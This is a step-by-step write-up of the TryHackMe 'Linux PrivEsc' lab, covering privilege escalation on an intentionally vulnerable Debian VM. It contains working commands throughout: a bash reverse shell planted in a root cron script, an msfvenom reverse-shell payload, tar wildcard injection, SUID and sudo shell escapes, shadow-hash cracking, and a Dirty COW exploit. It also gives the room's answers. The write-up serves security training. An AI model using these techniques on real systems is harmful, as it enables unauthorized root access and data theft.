![Windows PrivEsc Banner](https://i.imgur.com/RuMC2vG.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Linux_Priv_Esc_Cover.png" alt="Linux PrivEsc Logo">
</p>

# Linux PrivEsc

This guide contains the answer and steps necessary to get to them for the [Linux PrivEsc](https://tryhackme.com/room/linuxprivesc) room.

## Table of contents

- [Deploy the Vulnerable Debian VM](#deploy-the-vulnerable-debian-vm)
- [Service Exploits](#service-exploits)
- [Weak File Permissions - Readable /etc/shadow](#weak-file-permissions---readable-etcshadow)
- [Weak File Permissions - Writable /etc/passwd](#weak-file-permissions---writable-etcshadow)
- [Sudo - Shell Escape Sequences](#sudo---shell-escape-sequences)
- [Sudo - Environment Variables](#sudo---environment-variables)
- [Cron Jobs - File Permissions](#cron-jobs---file-permissions)
- [Cron Jobs - PATH Environment Variable](#cron-jobs---path-environment-variable)
- [Cron Jobs - Wildcards](#cron-jobs---wildcards)
- [SUID / SGID Executables - Known Exploits](#suid--sgid-executables---known-exploits)
- [SUID / SGID Executables - Shared Object Injection](#suid--sgid-executables---shared-object-injection)
- [SUID / SGID Executables - Environment Variables](#suid--sgid-executables---environment-variables)
- [SUID / SGID Executables - Abusing Shell Features (#1)](#suid--sgid-executables---abusing-shell-features-1)
- [SUID / SGID Executables - Abusing Shell Features (#2)](#suid--sgid-executables---abusing-shell-features-2)
- [Passwords & Keys - History Files](#passwords--keys---history-files)
- [Passwords & Keys - Config Files](#passwords--keys---config-files)
- [Passwords & Keys - SSH Keys](#passwords--keys---ssh-keys)
- [NFS](#nfs)
- [Kernel Exploits](#kernel-exploits)
- [Privilege Escalation Scripts ](#privilege-escalation-scripts)

### Deploy the Vulnerable Debian VM

**Username:** user

**Password:** password321

https://www.exploit-db.com/exploits/1518

```cmd
ssh user@10.10.42.225
```

![Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Linux_Priv_Esc_Nmap_Scan.png)


### Service Exploits

In this taask we will exploit the fact that the MySQL service runs as root and this user doesn't have a password assigned to it.

*Read and follow along with the above.*

First we navigate to the folder containing the exploit files.

```cmd
cd /home/user/tools/mysql-udf
```

Now we compile the exploit code with the following code:

```cmd
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

![First Compile](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Service_Exploits_First_Compile.png)

![Second Compile](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Service_Exploits_Second_Compile.png)

Now we can connect to the MySQL service as the root user with a blank password.

```cmd
mysql -u root
```

![Start Mysql](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Service_Exploits_Start_Mysql.png)

First we create a new table in the `mysql` database:

```cmd
use mysql;
create table foo(line blob);
```

![Create Table](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Service_Exploits_Create_Table.png)

Then we insert the exploit code into the table and dump the output.

```cmd
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
```

![Insert Values](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Service_Exploits_Insert_Values.png)

![Select](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Service_Exploits_Select.png)

Lastly, we creat a User Defined Function 'do_system'.

```cmd
create function do_system returns integer soname 'raptor_udf2.so';
```

![Create Function](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Service_Exploits_Create_Function.png)

Now we can user this function to copy /bin/bash to /tmp/rootbash.

```cmd
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

![Select Function](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Service_Exploits_Select_Function.png)

Finally, we can navigate to the copied file and with it to get a root shell.

![Go Rootbash](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Service_Exploits_Go_Rootbash.png)

```cmd
./rootbash -p
```

![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Service_Exploits_Root_Shell.png)

After we are finished, we should remove the file again.

```cmd
.rm rootbash
exit
```

![Remove Rootbash](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Service_Exploits_Remove_Rootbash.png)

### Weak File Permissions - Readable /etc/shadow

In this task we utilize insecure read permissions for the /etc/shadow file.

1. What is the root user's password hash?

   We first need to find the permission we have for this file as a normal user.

   ```cmd
   ls -lh /etc/shadow
   ```
   
   ![Shadow Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Readable_Shadow_Permissions.png)
   
   Looks like the file as read and write permissions for all users. We can now view the file.
   
   ```cmd
   cat /etc/shadow
   ```
   
   Here we can find the has for the user `root` between the first two `:`.
   
   ![Contents](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Readable_Shadow_Contents.png)

   ><details><summary>Click for answer</summary>$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0</details>

2. What hashing algorithm was used to produce the root user's password hash?

   THe first thing we can try is `hash-identifier` to find the hashing algorithm.
   
   ![Hash Identifier](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Readable_Shadow_Hash_Identifier.png)
   
   Looks like it is a SHA256 hash. However, using examples from `hashcat` we can find the exact hash by looking at the format.
   
   ![Hashcat Examples](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Readable_Shadow_Hashcat_Examples.png)

   ><details><summary>Click for answer</summary>sha512crypt</details>

3. What is the root user's password?

   The next step is to crack the password with either `hashcat` or `john`. 
   
   ```cmd
   hashcat -m 1800 password.hash /usr/share/wordlists/rockyou.txt
   ```
   
   ![Hashcat Results](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Readable_Shadow_Hashcat_Results.png)
   
   ```cmd
   john --wordlist=/usr/share/wordlists/rockyou.txt password.hash
   ```
   
   ![John Results](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Readable_Shadow_John_Results.png)
   
   Now we can use the found password to switch to the root user.
   
   ```cmd
   su -u root
   ```
   
   ><details><summary>Click for answer</summary>password123</details>

### Weak File Permissions - Writable /etc/shadow

In this task we utilize insecure write permissions for the /etc/shadow file.

*Read and follow along with the above.*

Again we can use `ls -lh /etc/shadow` to find out what the permissions for this file are.

![Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Writable_Shadow_Permissions.png)

Instead of cracking the password, we can simply add our own, since we have write permissions for this file. We can use `mkpasswd` to create the hashed password.

```cmd
mkpasswd -m sha-512 iamroot
```

Next we can replace the root users password with our own password.

![Modify](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Writable_Shadow_Modify.png)

Now we can switch to the root user with our own password.

![Root](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Writable_Shadow_Root.png)

### Weak File Permissions - Writable /etc/passwd

In this task we utilize insecure write permissions for the /etc/passwd file.

We first use the following command to find the permissions we have for the `/etc/passwd` file.

```cmd
ls -l /etc/passwd
```

![Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Writable_Passwd_Permissions.png)

Looks like we have write access. Lets create a new password for the root user we can substitute. This can be done on our target machine or attack machine. Due to the way the machines are setup the resulting hashes may be different as they use a different method. However, the outcome should be the same.

```cmd
openssl passwd iamroot
```

![Creation](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Writable_Passwd_Creation.png)

We can do two things now. We can either replace the root users password with our new one. Or we can copy the root user line in the `passwd` file and change the name and password. I will use the second option here.

![Modification](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Writable_Passwd_Modification.png)

Now we can switch to our new user with the following and enter the newly created password:

```cmd
su newroot
```

![Root](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Writable_Passwd_Root.png)

1. Run the "id" command as the newroot user. What is the result?

   ![Id](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Writable_Passwd_Id.png)

   ><details><summary>Click for answer</summary>uid=0(root) gid=0(root) groups=0(root)</details>

### Sudo - Shell Escape Sequences

In this task we will abuse the insecure sudo settings for various bins on the file system.

1. How many programs is "user" allowed to run via sudo? 

   We can use `sudo -l` to view all the executables we can run with sudo.
   
   ![Sudo](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Shell_Escape_Sudo.png)
   
   ><details><summary>Click for answer</summary>11</details>
   
2. One program on the list doesn't have a shell escape sequence on GTFOBins. Which is it?

   After going through the entire list in GTFOBins, there is one binary that was not listed on the website.
   
   ><details><summary>Click for answer</summary>apache2</details>

*Consider how you might use this program with sudo to gain root privileges without a shell escape sequence.*

```cmd
sudo apache2 -f /etc/shadow
```

![Apache 2](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Shell_Escape_Apache2.png)

https://touhidshaikh.com/blog/2018/04/abusing-sudo-linux-privilege-escalation/

**Extra challenge:** We can use (https://gtfobins.github.io/) to find out how to get an elevated shell with each binary.

**awk**

```cmd
sudo awk 'BEGIN {system("/bin/sh")}'
```

![Awk](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Shell_Escape_Awk.png)

**iftop**

```cmd
sudo iftop
!/bin/sh
```

![Iftop](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Shell_Escape_Iftop.png)
   
**find**

```cmd
sudo find . -exec /bin/sh \; -quit
```

![Find](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Shell_Escape_Find.png)

**ftp**

```cmd
sudo ftp
!/bin/sh
```

![Ftp](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Shell_Escape_Ftp.png)

**less**

```cmd
sudo less /etc/profile
!/bin/sh
```

![Less](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Shell_Escape_Less.png)

**man**

```cmd
sudo man man
!/bin/sh
```

![Man](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Shell_Escape_Man.png)

**more**

```cmd
TERM= sudo more /etc/profile
!/bin/sh
```

![More](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Shell_Escape_More.png)

**nano**

```cmd
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

![Nano](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Shell_Escape_Nano.png)

**nmap**

```cmd
sudo nmap --interactive
nmap> !sh
```

![Nmap](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Shell_Escape_Nmap.png)

**vim**

```cmd
sudo vim -c ':!/bin/sh'
```

![Vim](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Shell_Escape_Vim.png)

### Sudo - Environment Variables

In this task we will use the environmental variable settings for sudo.

Using `sudo -l` we can check which environment variables are inherited.

![Sudo](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Shell_Escape_Sudo.png)

*Read and follow along with the above.*

First we create a shared object using the code provided:

```cmd
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

Next, we run one of the programs we are allowed to run with sudo

```cmd
sudo LD_PRELOAD=/tmp/preload.so find
```

![Pre Load](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Environment_Variables_Preload.png)

We run `ldd` to check which shared libraries are used by the program.

```cmd
ldd /usr/sbin/apache2
```

![Libraries](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Environment_Variables_Libraries.png)

Now we created another shared object with the same name as one of the listed libraries.

```cmd
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

And now we run apache with sudo

```cmd
sudo LD_LIBRARY_PATH=/tmp apache2
```

![Library](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Environment_Variables_Library.png)

### Cron Jobs - File Permissions

In this task we will use weak file permissions for scheduled tasks.

First we look at the contents of the system-wide crontab.

```cmd
cat /etc/crontab
```

![Crontab](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Cron_File_Permissions_Crontab.png)

Looks like one of the tasks executes a script. We can easily locate it with `locate`.

```cmd
locate overwrite.sh
```

![Locate](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Cron_File_Permissions_Locate.png)

Now that we know its location, lets look at the permissions we have for this file.

```cmd
ls -l /usr/local/bin/overwrite.sh
```

![Permission](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Cron_File_Permissions_Permission.png)

It seems like we have write access to it. How convenient. Lets open it up to edit the contents of the file.

```cmd
nano /usr/local/bin/overwrite.sh
```

Now we add the following code to the file.

```cmd
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

![Job](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Cron_File_Permissions_Job.png)

Then we start a listener on our device and wait for the task to execute a create a shell for us.

```cmd
nc -nvlp 4444
```

![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Cron_File_Permissions_Root_Shell.png)

### Cron Jobs - PATH Environment Variable

In this task we use the PATH variable to execute our own code.

First we look at the contents of the system-wide crontab.

```cmd
cat /etc/crontab
```

![Crontab](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Cron_File_Permissions_Crontab.png)

Looks like it looks for the scripts in `/home/user`. Lets create our own script in this folder.

```cmd
touch overwrite.sh
nano overwrite.sh
```

![Create Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Cron_File_Path_Create_Script.png)

Now we add the following code to this file (similar to the previous task)

```cmd
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

![Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Cron_File_Path_Script.png)

Next, we must make sure this script is executable with `chmod`.

```cmd
chmod +x /home/user/overwrite.sh
```

![Chmod](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Cron_File_Path_Chmod.png)

If executed properly, this should create an executable we can run in the `/tmp/` folder. Running the following command should give us a root shell.

```cmd
/tmp/rootbash -p
```

![Variable](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Cron_File_Path_Variable.png)

Before moving on, we must remove the script.

```cmd
rm /tmp/rootbash
exit
```

![Remove](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Cron_File_Path_Remove.png)

1. What is the value of the PATH variable in /etc/crontab?

   ><details><summary>Click for answer</summary>/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</details>

### Cron Jobs - Wildcards

In this task we will utilize the fact that `tar` can be used with a wildcard to run extra commands.

*Read and follow along with the above.*

Lets look at the other file in the crontab.

```cmd
cat /usr/local/bin/compress.sh
```

![Compress](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Cron_Wild_Cards_Compress.png)

On [GTFO Bins](https://gtfobins.github.io/gtfobins/tar/) we can see which commands we can run with tar. We can use `msfvenom` to create the necessary payload.

```cmd
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.18.78.136 LPORT=1337 -f elf -o shell.elf
```

Now we use `scp` to transfer this file to our target machine.

```cmd
scp -r -oHostKeyAlgorithms=+ssh-rsa shell.elf user@10.10.136.213:/home/user/shell.elf
```

![Scp](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Cron_Wild_Cards_Scp.png)

We must make this file executable:

```cmd
chmod +x /home/user/shell.elf
```

Next we must create two files in the user folder.

```cmd
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```

![Create Files](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Cron_Wild_Cards_Create_Files.png)

Now we just set up a listener on our machine a wait for the task to run.

```cmd
nc -nlvp 1337
```

![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Cron_Wild_Cards_Root_Shell.png)

Lastly, we must remove the files again.

```cmd
rm /home/user/shell.elf
rm /home/user/--checkpoint=1
rm /home/user/--checkpoint-action=exec=shell.elf
```

### SUID / SGID Executables - Known Exploits

In this task we will abuse known exploits for binaries with their SUID bit set.

*Read and follow along with the above.*

We use the following command to find all executables with their SUID/SGID bit set.

```cmd
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

![Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/SUID_Known_Exploits_Permissions.png)

Another method I use myself is:

```cmd
find / -perm -4000 2> /dev/null
```

![Permissions 2](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/SUID_Known_Exploits_Permissions_2.png)

Looks like there is an exploit we can use.

![Exploit Database](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/SUID_Known_Exploits_Exploit_Database.png)

We can use the pre-made script from the machine.

```cmd
s -lh tools/suid/exim
```

```cmd
./tools/suid/exim/cve-2016-1531.sh
```

![Auto Root](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/SUID_Known_Exploits_Auto_Root.png)

However, we can also create this file ourselves from the exploit database.

```cmd
touch cve-2016-1531.sh
nano cve-2016-1531.sh
```

![Create Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/SUID_Known_Exploits_Create_Script.png)

![Manual Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/SUID_Known_Exploits_Manual_Script.png)

Make sure it is executable and then run the script.

```cmd
chmod +x cve-2016-1531.sh
./cve-2016-1531.sh
```

![Manual Root](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/SUID_Known_Exploits_Manual_Root.png)

### SUID / SGID Executables - Shared Object Injection

In this task we exploit an executable that is vulnerable to shared object injection.

*Read and follow along with the above.*

The /usr/local/bin/suid-so executbale is vulnerable and when running it will give a progress bar.

```cmd
/usr/local/bin/suid-so
```

![SUID So](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Shared_Object_Injection_SUID_SO.png)

We now run `strace` to search the file for open/access calls and 'no such file' errors.

```cmd
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

![Strace](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Shared_Object_Injection_Strace.png)

Now we create the folder in which it is looking for a file (libcalc.so).

```cmd
mkdir /home/user/.config
```

Next, we compile a shared object that will give us a root shell.

```cmd
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```

![Create Object](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Shared_Object_Injection_Create_Object.png)

If we now run the executable again, we get a rootshell instead.

```cmd
/usr/local/bin/suid-so
```

![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Shared_Object_Injection_Root_Shell.png)

### SUID / SGID Executables - Environment Variables

In this task we exploit an executable due to it inheriting the user's PATH environment variable.

*Read and follow along with the above.*

First, we run the file to see what it tries to run.

```cmd
/usr/local/bin/suid-env
```

![SUID Env](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/SUID_Environment_Variables_SUID_ENV.png)

Looks like it tries running apache2 webservers. Running the following command we look for anything related to apache2.

```cmd
strings /usr/local/bin/suid-env
```

![Strings](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/SUID_Environment_Variables_Strings.png)

The full path for the apache2 service is not used. So we create an executable that will be run inplace of the real one.

```cmd
gcc -o service /home/user/tools/suid/service.c
```

![Create Object](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/SUID_Environment_Variables_Create_Object.png)

Now we must add the current directory to the PATH variable.

```cmd
PATH=.:$PATH /usr/local/bin/suid-env
```

![Path](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/SUID_Environment_Variables_Path.png)

Finally, we can run the executable again to get a root shell.

```cmd
/usr/local/bin/suid-env
```

![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/SUID_Environment_Variables_Root_Shell.png)

### SUID / SGID Executables - Abusing Shell Features (#1)

In this task we have a similar situation as the previous one. Only this time the executable uses the absolute path.

```cmd
/usr/local/bin/suid-env2
```

*Read and follow along with the above.*

We can verify this we the following command:

```cmd
strings /usr/local/bin/suid-env2
```

![Strings](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Abusing_Shell_Features_1_Strings.png)

We need to check the bash version as well as prior to 4.2-048 we can define a shell function with a name that resembles file paths.

```cmd
/bin/bash --version
```

![Bash Version](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/ABusing_Shell_Features_1_Bash_Version.png)

Now, we create a bash function `/usr/sbin/service` that executes a bash shell.

```cmd
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```

![Create Function](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Abusing_Shell_Features_1_Create_Function.png)

Finally, we can run the executable to get a root shell.

```cmd
/usr/local/bin/suid-env2
```

![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Abusing_Shell_Features_1_Root_Shell.png)

### SUID / SGID Executables - Abusing Shell Features (#2)

In this task we will exploit a debugging feature in bash 4.3 and prior.

*Read and follow along with the above.*

First, we run the `/usr/local/bin/suid-env2` executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:

```cmd
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

![Bash Debugging](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Abusing_Shell_Features_2_Bash_Debugging.png)

Now we can run the executable to get a root shell.

```cmd
/tmp/rootbash -p
```

![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Abusing_Shell_Features_2_Root_Shell.png)

After we are finished, we should remove the file for this challenge.

```cmd
rm /tmp/rootbash
exit
```

### Passwords & Keys - History Files

In this task we utilize commands being saved in a file and accidentally entered credentials.

1. What is the full mysql command the user executed?

   We can look at the history of commands typed with the following command:
   
   ```cmd
   cat ~/.*history | less
   ```
   
   ![Contents](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Passwords_History_Contents.png)

   This efectively looks through all files with 'history' in its name.
   
   ![File](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Passwords_History_File.png)
   
   With the credentials we found here, we can switch to the root user.
   
   ```cmd
   su root
   ```
   
   ![Root](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Passwords_History_Root.png)
   
   ><details><summary>Click for answer</summary>mysql -h somehost.local -uroot -ppassword123</details>

### Passwords & Keys - Config Files

In this task we use the fact that passwords may sometimes be stored in files as cleartext.

1. What file did you find the root user's credentials in?   

   Looking through the folder we can see there is a vpn config file.
   
   ```cmd
   ls -lh ~
   ```
   
   ![File](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Passwords_Config_File.png)
   
   We can read the file to see if we can find anything interesting.
   
   ```cmd
   cat /home/user/myvpn.ovpn
   ```
   
   ![Contents](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Passwords_Config_Contents.png)
   
   Looks like there could be credentials stored in one of the files mentioned here.
   
   ![Credentials](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Passwords_Config_Credentials.png)
   
   Now we can switch to the root user with this password.
   
   ```cmd
   su root
   ```
   
   ![Root](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Passwords_Config_Root.png)

   ><details><summary>Click for answer</summary>/etc/openvpn/auth.txt</details>

### Passwords & Keys - SSH Keys

In this task we make use of lingering backup files with credentials.

*Read and follow along with the above.*

```cmd
ls -la /
```

![Folder](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Passwords_SSH_Folder.png)

We can see several hidden folders, of which the following might be of interest.

```cmd
ls -lh /.ssh
```

![Contents](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Passwords_SSH_Contents.png)

Lets look at the key contents.

```cmd
cat /.ssh/root_key
```

![Key](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Passwords_SSH_Key.png)

With can copy this key to our attack machine to ssh into the target with it a get root access.

![Create Key](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Passwords_SSH_Create_Key.png)

We must give the key the right permissions, otherwise the ssh client will not accept it.

![Permissions Error](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Passwords_SSH_Permissions_Error.png)

```cmd
chmod 600 root_key 
```

![Permissions Change](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Passwords_SSH_Permissions_Change.png)

Now it does work.

```cmd
ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.65.67
```

![Root](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Passwords_SSH_Root.png)

### NFS

In this task we use tha fact that files created via NFS inherit the remote user's ID.

1. What is the name of the option that disables root squashing?

   First we check the NFS share configuration.
   
   ```cmd
   cat /etc/exports
   ```
   
   ![Exports](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/NFS_Exports.png)
   
   It seems root squaching is not enabled.
   
   On our attack machine we switch to the root user and create a mount point.
   
   ```cmd
   sudo su
   mkdir /tmp/nfs
   ```
   
   ![Root Tmp](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/NFS_Root_Tmp.png)
   
   Now we can mount the target machines `/tmp/` folder to our machine.
   
   ```cmd
   mount -o rw,vers=3 10.10.197.244:/tmp /tmp/nfs
   ```
   
   ![Mount](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/NFS_Mount.png)
   
   Still on our attack machine we create a payload with msfvenom.
   
   ```cmd
   sudo msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
   sudo chmod +xs /tmp/nfs/shell.elf
   ```
   
   ![Msfvenom](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/NFS_Msfvenom.png)
   
   ![Chmod](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/NFS_Chmod.png)
   
   We can check to see if the file is indeed in the `/tmp/` folder.
   
   ```cmd
   ls -lh /tmp
   ```
   
   ![Tmp Folder](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/NFS_Tmp_Folder.png)
   
   Finally, we can run this file from the target machine.
   
   ```cmd
   /tmp/shell.elf
   ```
   
   ![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/NFS_Root_Shell.png)
      
   ><details><summary>Click for answer</summary>no_root_squash</details>

### Kernel Exploits

In this task we look for any kernel exploits we can use on this machine. Dirty cow in this situation.

*Read and follow along with the above.*

First, we run the Linux Exploit Suggester 2 tool.

```cmd
perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
```

![Suggester](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Kernel_Exploits_Suggester.png)

Looks like we can use the Dirty COW exploit. Lets compile the code and run it.

```cmd
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
./c0w
```

![Compile](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Kernel_Exploits_Compile.png)

![Dirty Cow](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Kernel_Exploits_Dirty_Cow.png)

Now that the exploit has been run, we can run the passwd file to get a root shell.

```cmd
/usr/bin/passwd
```

![Run Exploit](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Kernel_Exploits_Run_Exploit.png)

Lastly, we should remove the created files before we continue.

```cmd
mv /tmp/bak /usr/bin/passwd
exit
```

![Remove](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Kernel_Exploits_Remove.png)

### Privilege Escalation Scripts 

In this final task we experiment with some automation scripts that look for these privelege escalation methods. Most if not all of those we manually found are listed by these scripts. 

*Read and follow along with the above.*

In the `privesc-scripts` folder we find three automation scripts.

```cmd
cd /home/user/tools/privesc-scripts
```

Running LinEnum first, we can see everything it comes up with, including things we previously found. Like the SUID and SGID files.

```cmd
./LinEnum.sh
```

